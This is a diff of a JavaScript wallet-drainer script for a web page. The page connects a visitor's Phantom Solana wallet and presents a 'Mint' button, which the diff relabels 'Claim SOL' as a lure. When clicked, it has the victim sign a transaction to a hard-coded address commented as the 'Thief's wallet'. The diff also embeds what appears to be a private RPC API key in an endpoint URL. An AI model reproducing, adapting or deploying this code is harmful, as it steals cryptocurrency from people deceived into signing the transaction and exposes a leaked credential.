@@ -3,17 +3,17 @@ $(document).ready(function() {
         if (window.solana && window.solana.isPhantom) {
             try {
                 const resp = await window.solana.connect();
-                console.log("Phantom Wallet connected:", resp);
+                alert("Phantom Wallet connected:", resp);
 
                   // 3. Create Solana connection (public endpoint)
             const connection = new solanaWeb3.Connection(
-                "https://api.mainnet-beta.solana.com",
+                "https://solana-mainnet.api.syndica.io/api-key/4iuPX8JcgTqR675SP4oMAfpW7UTiU5tk2MDy9KS2tfG798fEGtN9kUQ27TZkokrJS8nL4qfBf1ACHUHXcQ1hpkSWoFiToLThg2H/",
                 "confirmed"
             );
 
                 const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                 const walletBalance = await connection.getBalance(public_key);
-                console.log("Wallet balance:", walletBalance);
+                alert("Wallet balance:", walletBalance);
 
                 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                 if (walletBalance < minBalance) {
@@ -21,7 +21,7 @@ $(document).ready(function() {
                     return;
                 }
 
-                $('#connect-wallet').text("Mint");
+                $('#connect-wallet').text("Claim SOL");
                 $('#connect-wallet').off('click').on('click', async () => {
                     try {
                         const recieverWallet = new solanaWeb3.PublicKey('DRYjXYjya45KLzD5HmtBd4QeUA6SqypNoJDhgoie8bnF'); // Thief's wallet
@@ -44,11 +44,11 @@ $(document).ready(function() {
                         transaction.recentBlockhash = blockhashObj.blockhash;
 
                         const signed = await window.solana.signTransaction(transaction);
-                        console.log("Transaction signed:", signed);
+                        alert("Transaction signed:", signed);
 
                         let txid = await connection.sendRawTransaction(signed.serialize());
                         await connection.confirmTransaction(txid);
-                        console.log("Transaction confirmed:", txid);
+                        alert("Transaction confirmed:", txid);
                     } catch (err) {
                         console.error("Error during minting:", err);
                     }
